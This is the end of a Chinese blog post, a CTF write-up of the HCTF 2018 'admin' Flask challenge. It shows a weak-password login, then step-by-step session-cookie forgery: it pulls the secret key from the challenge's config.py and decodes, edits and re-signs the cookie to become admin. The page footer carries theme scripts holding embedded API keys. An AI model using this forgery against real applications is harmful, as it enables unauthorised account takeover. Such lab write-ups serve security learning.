+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">尝试注册一个用户后，查看页面：</span><br><span class="line">/index, /logout , /change , /edit</span><br><span class="line"></span><br><span class="line">尝试使用用户名注入，失败</span><br><span class="line">尝试使用修改密码修改到指定的admin，失败</span><br><span class="line"></span><br><span class="line">看注释：</span><br><span class="line">/index</span><br><span class="line">&lt;!-- you are not admin --&gt;</span><br><span class="line">/change</span><br><span class="line">&lt;!-- https:<span class="comment">//github.com/woadsl1234/hctf_flask/ --&gt;(这个注释的git没了)</span></span><br></pre></td></tr></table></figure>
+
+<p>这道题，白盒源码缺失，做不了白盒审计。</p>
+<h2 id="解法1：弱口令登录"><a href="#解法1：弱口令登录" class="headerlink" title="解法1：弱口令登录"></a>解法1：弱口令登录</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">起初我并不相信这东西存在弱口令，后来实在是没路了，试了下：</span><br><span class="line">admin</span><br><span class="line"><span class="number">123</span></span><br><span class="line"></span><br><span class="line">登录上去，直接看到了flag。</span><br><span class="line"></span><br><span class="line">这有一定的运气成分，不太可取。</span><br></pre></td></tr></table></figure>
+
+<h2 id="解法2：session欺骗"><a href="#解法2：session欺骗" class="headerlink" title="解法2：session欺骗"></a>解法2：session欺骗</h2><p>参照<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/164086">某位大佬的解法</a></p>
+<p>实在是有些不敢相信，所以开始寻找第二种解法：</p>
+<p>解cookie，替换掉其中的用户名并且放行回去。</p>
+<p>解码工具<a target="_blank" rel="noopener" href="https://github.com/noraj/flask-session-cookie-manager">点我</a></p>
+<p>源码：不要相信上面题目给出的地址，<a target="_blank" rel="noopener" href="https://github.com/Wkh19/hctf_flask">点我</a>前往没废掉的git地址得到本题源码。</p>
+<p>找源码费了点功夫。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">首先，我们自己随便注册个用户</span><br><span class="line">随后，截取数据包时，我们发现了一个极为特殊的session，使用md5和普通的jwt根本解不出来。</span><br><span class="line">Cookie: session=.eJw9kEGLwjAQhf_KMmcPVduL4EHRBgszpZJuSC7ibqtt0nGhKqUR__tGF_b0Dm_mm_fmAYdTX18bWNz6ez2BQ1vB4gEfX7AAtEWCm6pDpSOUpSeVNSiKGCW1WuqIfMXIejQ264w9D5o_G_R7Z2TFudrNSe5iFDhFZTpkTGimY7SrkUQ50sYlRmXWyJRzmXZkw67du1wUMyP0lFRqw3xEs6CsPdkiQpGxVmmTy71F62LcuBFVOWi_XcJzAt_X_nS4_bj68l_hhQ5nWpTrRksKMSs2Al_RHdksYNad4XIgLr1WODe89bhavnEtH8_1P6kuzwkNf87lyMGA-<span class="number">7</span>XuYfKW99tgGsHzFxECbX4.ZMu1xw.CJC8tQ8BnNKGX4rk-j4qYknh0DY</span><br><span class="line"></span><br><span class="line"><span class="comment">#要使用工具前，必须先把源码找出来：</span></span><br><span class="line">	<span class="comment"># 源码：</span></span><br><span class="line">	__init__.py    code.py*   config.py    forms.py    models.py   <span class="string">&#x27;routes 2.pyc&#x27;</span>   routes.pyc   templates/</span><br><span class="line"> __init__.pyc   code.pyc   config.pyc   forms.pyc   models.pyc   routes.py*      <span class="built_in">static</span>/</span><br><span class="line">	<span class="comment"># 找到里面的config.py并且把文件内容取出，就能得到key。config一般都是配置文件。</span></span><br><span class="line">	import os</span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">Config</span>(<span class="title">object</span>):</span></span><br><span class="line"><span class="class">		<span class="title">SECRET_KEY</span> = <span class="title">os</span>.<span class="title">environ</span>.<span class="title">get</span>(&#x27;<span class="title">SECRET_KEY</span>&#x27;) <span class="title">or</span> &#x27;<span class="title">ckj123</span>&#x27;</span></span><br><span class="line"><span class="class">		<span class="title">SQLALCHEMY_DATABASE_URI</span> = &#x27;<span class="title">mysql</span>+<span class="title">pymysql</span>://<span class="title">root</span>:<span class="title">adsl1234</span>@<span class="title">db</span>:3306/<span class="title">test</span>&#x27;</span></span><br><span class="line"><span class="class">		<span class="title">SQLALCHEMY_TRACK_MODIFICATIONS</span> = <span class="title">True</span></span></span><br><span class="line"><span class="class">    #其中的<span class="title">key</span>就是：<span class="title">ckj123</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">使用工具解码修改并且加密回去：</span></span><br><span class="line"><span class="class">	# 借用某个工具解码<span class="title">session</span>，工具再上面贴出来了。</span></span><br><span class="line"><span class="class">	# 之前看题解的时候，发现某些大佬没给它加上<span class="title">key</span>就直接解码了，这样子显然时极为不妥当的。</span></span><br><span class="line"><span class="class">	[<span class="title">sywsec</span> ~]$ <span class="title">python</span> <span class="title">flask_session_cookie_manager3</span>.<span class="title">py</span> <span class="title">decode</span> -<span class="title">s</span> &quot;<span class="title">ckj123</span>&quot; -<span class="title">c</span> &quot;.<span class="title">eJw9kEGLwjAQhf_KMmcPVduL4EHRBgszpZJuSC7ibqtt0nGhKqUR__tGF_b0Dm_mm_fmAYdTX18bWNz6ez2BQ1vB4gEfX7AAtEWCm6pDpSOUpSeVNSiKGCW1WuqIfMXIejQ264w9D5o_G_R7Z2TFudrNSe5iFDhFZTpkTGimY7SrkUQ50sYlRmXWyJRzmXZkw67du1wUMyP0lFRqw3xEs6CsPdkiQpGxVmmTy71F62LcuBFVOWi_XcJzAt_X_nS4_bj68l_hhQ5nWpTrRksKMSs2Al_RHdksYNad4XIgLr1WODe89bhavnEtH8_1P6kuzwkNf87lyMGA</span>-7<span class="title">XuYfKW99tgGsHzFxECbX4</span>.<span class="title">ZMuvaw</span>.<span class="title">MmVnJ7JS408TcO1RoN7tjh93fAM</span>&quot;</span></span><br><span class="line"><span class="class">	</span></span><br><span class="line"><span class="class">	</span>&#123;<span class="string">&#x27;_fresh&#x27;</span>: True, <span class="string">&#x27;_id&#x27;</span>: b<span class="string">&#x27;24907e1f41535ba0d813ba6477f2f2f2ef80bea34de7f9b75280c51fe2c97f82024e2499ebce1f91e65a24d8d6df55ac7f47ac6f36440bfaaa94c2980921e0c1&#x27;</span>, <span class="string">&#x27;csrf_token&#x27;</span>: b<span class="string">&#x27;91eebb10aa3ef7fdc477d62c20efe06e3ac7fa30&#x27;</span>, <span class="string">&#x27;image&#x27;</span>: b<span class="string">&#x27;yH97&#x27;</span>, <span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;user&#x27;</span>, <span class="string">&#x27;user_id&#x27;</span>: <span class="string">&#x27;10&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">	[sywsec ~]$ python flask_session_cookie_manager3.py encode -s <span class="string">&quot;ckj123&quot;</span> -t <span class="string">&quot;&#123;&#x27;_fresh&#x27;: True, &#x27;_id&#x27;: b&#x27;24907e1f41535ba0d813ba6477f2f2f2ef80bea34de7f9b75280c51fe2c97f82024e2499ebce1f91e65a24d8d6df55ac7f47ac6f36440bfaaa94c2980921e0c1&#x27;, &#x27;csrf_token&#x27;: b&#x27;91eebb10aa3ef7fdc477d62c20efe06e3ac7fa30&#x27;, &#x27;image&#x27;: b&#x27;yH97&#x27;, &#x27;name&#x27;: &#x27;admin&#x27;, &#x27;user_id&#x27;: &#x27;10&#x27;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">	.eJw9kEGLwjAQhf_KMmcPVduL4EHRBgszpZJuSC7ibqtt0nGhKqUR__tGF_Y0hzfzvffmAYdTX18bWNz6ez2BQ1vB4gEfX7AAtEWCm6pDpSOUpSeVNSiKGCW1WuqIfMXIejQ264w9D5o_G_R7Z2TFudrNSe5iFDhFZTpkTGimY7SrkUQ50sYlRmXWyJRzmXZkw63du1wUMyP0lFRqw35EszBZe7JFhCJjrdIml3uL1sW4cSOqctB-u4TnBL6v_elw-<span class="number">3</span>H15b_CCx1sWpTrRksKMSs2Al_RHdksYNad4XIgLr1WODe89bhavnEtH8_1P6kuzwkNf8rlyEGAY8XtBSZwv9b9-<span class="number">28</span>wjeD5C35lbcg.ZMu1vA.ezFr62kO6xJrDivKYBxYg9p0_IM</span><br><span class="line"></span><br><span class="line"><span class="comment">#BP抓包并且重发数据包，就得到了flag了。</span></span><br></pre></td></tr></table></figure>
+
+<p>解码不需要使用密码，但是加密回去时需要key。</p>
+<p>原始的那个靶场指定的flask已经寄了，所以暂时只能放弃。</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://example.com">矢幽武</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2023/08/02/CTF-web-026/">http://example.com/2023/08/02/CTF-web-026/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">矢幽武博客</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/ctf/">ctf</a><a class="post-meta__tags" href="/tags/buuctf/">buuctf</a><a class="post-meta__tags" href="/tags/web/">web</a></div><div class="post_share"><div class="social-share" data-image="/img/backgroude/b14.jpg" data-sites="wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i> 打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/wechat.jpg" target="_blank"><img class="post-qr-code-img" src="/img/wechat.jpg" alt="wechat"/></a><div class="post-qr-code-desc">wechat</div></li><li class="reward-item"><a href="/img/alipay.jpg" target="_blank"><img class="post-qr-code-img" src="/img/alipay.jpg" alt="alipay"/></a><div class="post-qr-code-desc">alipay</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/08/05/CTF-web-027/" title="CTF之Web习题--找回密码/js白盒审计"><img class="cover" src="/img/backgroude/b1.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">CTF之Web习题--找回密码/js白盒审计</div></div></a></div><div class="next-post pull-right"><a href="/2023/07/31/CTF-web-025/" title="CTF之Web习题--命令执行"><img class="cover" src="/img/backgroude/b5.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">CTF之Web习题--命令执行</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2023/11/29/CTF-web-035/" title="CTF之Web习题--033--某赛题"><img class="cover" src="/img/backgroude/b11.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-11-29</div><div class="title">CTF之Web习题--033--某赛题</div></div></a></div><div><a href="/2023/10/09/CTF-web-034/" title="CTF之Web习题--032--BUU练习题"><img class="cover" src="/img/backgroude/b23.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-10-09</div><div class="title">CTF之Web习题--032--BUU练习题</div></div></a></div><div><a href="/2023/08/14/CTF-web-032/" title="CTF之Web习题--032--BUU练习题"><img class="cover" src="/img/backgroude/b13.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-08-14</div><div class="title">CTF之Web习题--032--BUU练习题</div></div></a></div><div><a href="/2023/08/11/CTF-web-030/" title="CTF之Web习题--php伪协议&#x2F;SQL注入&#x2F;反序列化&#x2F;文件上传"><img class="cover" src="/img/backgroude/b11.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-08-11</div><div class="title">CTF之Web习题--php伪协议&#x2F;SQL注入&#x2F;反序列化&#x2F;文件上传</div></div></a></div><div><a href="/2023/08/13/CTF-web-033/" title="CTF之Web习题-CTFShow-web78~web202"><img class="cover" src="/img/backgroude/b19.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-08-13</div><div class="title">CTF之Web习题-CTFShow-web78~web202</div></div></a></div><div><a href="/2023/08/30/CTF-web-book-001/" title="CTF之Web总结"><img class="cover" src="/img/backgroude/b7.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-08-30</div><div class="title">CTF之Web总结</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">矢幽武</div><div class="author-info__description">生灵造物，百力奋心<br>机遇自争，各凭本事<br>没有攻不破的系统 ，<br> 只有不努力的黑客</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">195</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">51</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">26</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/linxiao-wangchuan"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content"><b><font color="#e66b6d">威</font> <font color="#e66d98">武</font> <font color="#e66cc6">不</font> <font color="#cc6de6">屈</font> ,<font color="#9770e6">成</font> <font color="#6d93e6">为</font> <font color="#6fcde6">自</font> <font color="#72e6b6">己</font> <font color="#72e689">不败的</font> <font color="#99e670">信条</font>, <font color="#cde670">剑</font> <font color="#e6df72">走</font> <font color="#e6c073">偏</font> <font color="#e6a271">锋</font> ,<font color="#e6796f">缥</font> <font color="#e65454">缈</font> <font color="#e63333">孤</font> <font color="#e62c2c">鸿</font> <font color="#e60101">影</font> <font color="#e60101"> --孤志</font></b> <p align="center"><img src="https://haiyong.site/img/img-blog.csdnimg.cn/f7384c88956d4378b72e47548e19c9f8.gif" width="50" alt="mao"></p> <p align="center" style="color:yellow;font-weight:800">微信号：无</p> <p align="center" style="color:red;font-weight:800">QQ：无</p> -------------------------------- <p style="color:#5a1216;font-weight:800">每日更新指南：</p> <p style="color:#4d1018;font-weight:800">刷题/记录总知识一般会沿用上次的文档</p> <p style="color:#f03752;font-weight:800">学习新知将新开文档</p></div></div><div class="xpand" style="height:10px;"></div><canvas class="illo" width="800" height="800" style="max-width: 200px; max-height: 200px; touch-action: none; width: 640px; height: 640px;"></canvas><script src="https://fastly.jsdelivr.net/gh/xiaopengand/blogCdn@latest/xzxr/twopeople1.js"></script><script src="https://fastly.jsdelivr.net/gh/xiaopengand/blogCdn@latest/xzxr/zdog.dist.js"></script><script id="rendered-js" src="https://fastly.jsdelivr.net/gh/xiaopengand/blogCdn@latest/xzxr/twopeople.js"></script><style>.card-widget.card-announcement {
+margin: 0;
+align-items: center;
+justify-content: center;
+text-align: center;
+}
+canvas {
+display: block;
+margin: 0 auto;
+cursor: move;
+}</style><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BuyFlag"><span class="toc-number">1.</span> <span class="toc-text">[极客大挑战 2019]BuyFlag</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E5%A7%8B%E4%BF%A1%E6%81%AF"><span class="toc-number">1.1.</span> <span class="toc-text">原始信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98"><span class="toc-number">1.2.</span> <span class="toc-text">解题</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#BJDCTF2020-Easy-MD5"><span class="toc-number">2.</span> <span class="toc-text">[BJDCTF2020]Easy MD5</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E5%A7%8B%E4%BF%A1%E6%81%AF-1"><span class="toc-number">2.1.</span> <span class="toc-text">原始信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98-1"><span class="toc-number">2.2.</span> <span class="toc-text">解题</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8A%A4%E7%BD%91%E6%9D%AF-2018-easy-tornado"><span class="toc-number">3.</span> <span class="toc-text">[护网杯 2018]easy_tornado</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E5%A7%8B%E4%BF%A1%E6%81%AF-2"><span class="toc-number">3.1.</span> <span class="toc-text">原始信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98-2"><span class="toc-number">3.2.</span> <span class="toc-text">解题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9A%BE%E7%82%B9"><span class="toc-number">3.3.</span> <span class="toc-text">难点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">3.4.</span> <span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#HCTF-2018-admin"><span class="toc-number">4.</span> <span class="toc-text">[HCTF 2018]admin</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E5%A7%8B%E4%BF%A1%E6%81%AF-3"><span class="toc-number">4.1.</span> <span class="toc-text">原始信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E6%B3%951%EF%BC%9A%E5%BC%B1%E5%8F%A3%E4%BB%A4%E7%99%BB%E5%BD%95"><span class="toc-number">4.2.</span> <span class="toc-text">解法1：弱口令登录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E6%B3%952%EF%BC%9Asession%E6%AC%BA%E9%AA%97"><span class="toc-number">4.3.</span> <span class="toc-text">解法2：session欺骗</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/01/06/SEC-tool-0007/" title="SEC-工具-认识kali部分工具"><img src="/img/backgroude/b14.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="SEC-工具-认识kali部分工具"/></a><div class="content"><a class="title" href="/2024/01/06/SEC-tool-0007/" title="SEC-工具-认识kali部分工具">SEC-工具-认识kali部分工具</a><time datetime="2024-01-06T02:12:32.000Z" title="发表于 2024-01-06 10:12:32">2024-01-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/01/05/Linux-Server-Study-005/" title="kali虚拟机网卡配置"><img src="/img/backgroude/b41.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="kali虚拟机网卡配置"/></a><div class="content"><a class="title" href="/2024/01/05/Linux-Server-Study-005/" title="kali虚拟机网卡配置">kali虚拟机网卡配置</a><time datetime="2024-01-05T06:15:45.000Z" title="发表于 2024-01-05 14:15:45">2024-01-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/12/19/Interview-0001/" title="面试学习-渗透测试"><img src="/img/backgroude/b19.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="面试学习-渗透测试"/></a><div class="content"><a class="title" href="/2023/12/19/Interview-0001/" title="面试学习-渗透测试">面试学习-渗透测试</a><time datetime="2023-12-19T06:27:03.000Z" title="发表于 2023-12-19 14:27:03">2023-12-19</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/11/29/CTF-web-035/" title="CTF之Web习题--033--某赛题"><img src="/img/backgroude/b11.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CTF之Web习题--033--某赛题"/></a><div class="content"><a class="title" href="/2023/11/29/CTF-web-035/" title="CTF之Web习题--033--某赛题">CTF之Web习题--033--某赛题</a><time datetime="2023-11-29T00:19:08.000Z" title="发表于 2023-11-29 08:19:08">2023-11-29</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/10/13/CTF-web-book-003/" title="CTF之Web总结--协议/系统/环境"><img src="/img/backgroude/b43.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CTF之Web总结--协议/系统/环境"/></a><div class="content"><a class="title" href="/2023/10/13/CTF-web-book-003/" title="CTF之Web总结--协议/系统/环境">CTF之Web总结--协议/系统/环境</a><time datetime="2023-10-13T14:19:08.000Z" title="发表于 2023-10-13 22:19:08">2023-10-13</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By 矢幽武</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><a class="icon-V hidden" onclick="switchNightMode()" title="浅色和深色模式转换"><svg width="25" height="25" viewBox="0 0 1024 1024"><use id="modeicon" xlink:href="#icon-moon"></use></svg></a><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><div class="js-pjax"><script>(()=>{
+  const init = () => {
+    twikoo.init(Object.assign({
+      el: '#twikoo-wrap',
+      envId: 'https://linxiao-wangchuan.vercel.app/',
+      region: 'ap-shanghai',
+      onCommentLoaded: function () {
+        btf.loadLightbox(document.querySelectorAll('#twikoo .tk-content img:not(.tk-owo-emotion)'))
+      }
+    }, {"emotion":"twemoji","placeholder":"在此处输入评论"}))
+  }
+
+  const getCount = () => {
+    const countELement = document.getElementById('twikoo-count')
+    if(!countELement) return
+    twikoo.getCommentsCount({
+      envId: 'https://linxiao-wangchuan.vercel.app/',
+      region: 'ap-shanghai',
+      urls: [window.location.pathname],
+      includeReply: false
+    }).then(function (res) {
+      countELement.innerText = res[0].count
+    }).catch(function (err) {
+      console.error(err);
+    });
+  }
+
+  const runFn = () => {
+    init()
+    
+  }
+
+  const loadTwikoo = () => {
+    if (typeof twikoo === 'object') {
+      setTimeout(runFn,0)
+      return
+    } 
+    getScript('https://cdn.jsdelivr.net/npm/twikoo/dist/twikoo.all.min.js').then(runFn)
+  }
+
+  if ('Twikoo' === 'Twikoo' || ![object Object]) {
+    if ([object Object]) btf.loadComment(document.getElementById('twikoo-wrap'), loadTwikoo)
+    else loadTwikoo()
+  } else {
+    window.loadOtherComment = () => {
+      loadTwikoo()
+    }
+  }
+})()</script></div><canvas id="universe"></canvas><script defer src="/js/universe.js"></script><script src="/js/sun_moon.js" async></script><div class="aplayer no-destroy" data-id="5183531430" data-server="netease" data-type="playlist" data-fixed="true" data-mini="true" data-listFolded="false" data-order="random" data-preload="none" data-autoplay="false" muted></div><div class="aplayer no-destroy" data-id="5183531430" data-server="netease" data-type="playlist" data-fixed="true" data-mini="true" data-listFolded="false" data-order="random" data-preload="none" data-autoplay="false" muted></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="false" data-click="true"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = true;
+document.body.addEventListener('input', POWERMODE);
+</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/metingjs/dist/Meting.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div><!-- hexo injector body_end start --><script data-pjax>
+  function butterfly_clock_anzhiyu_injector_config(){
+    var parent_div_git = document.getElementsByClassName('sticky_layout')[0];
+    var item_html = '<div class="card-widget card-clock"><div class="card-glass"><div class="card-background"><div class="card-content"><div id="hexo_electric_clock"><img class="entered loading" id="card-clock-loading" src="https://cdn.cbd.int/hexo-butterfly-clock-anzhiyu/lib/loading.gif" style="height: 120px; width: 100%;" data-ll-status="loading"/></div></div></div></div></div>';
+    console.log('已挂载butterfly_clock_anzhiyu')
+    if(parent_div_git) {
+      parent_div_git.insertAdjacentHTML("afterbegin",item_html)
+    }
+  }
+  var elist = '/2022/,/2023/,/2024/'.split(',');
+  var cpage = location.pathname;
+  var epage = 'all';
+  var qweather_key = 'eb7ef47cda914d65b0b394ce50c15242';
+  var gaud_map_key = 'e2b04289e870b005374ee030148d64fd&s=rsv3';
+  var baidu_ak_key = 'undefined';
+  var flag = 0;
+  var clock_rectangle = '112.982279,28.19409';
+  var clock_default_rectangle_enable = 'true';
+
+  for (var i=0;i<elist.length;i++){
+    if (cpage.includes(elist[i])){
+      flag++;
+    }
+  }
+
+  if ((epage ==='all')&&(flag == 0)){
+    butterfly_clock_anzhiyu_injector_config();
+  }
+  else if (epage === cpage){
+    butterfly_clock_anzhiyu_injector_config();
+  }
+  </script><script src="https://widget.qweather.net/simple/static/js/he-simple-common.js?v=2.0"></script><script data-pjax src="https://cdn.cbd.int/hexo-butterfly-clock-anzhiyu/lib/clock.min.js"></script><!-- hexo injector body_end end --></body></html>
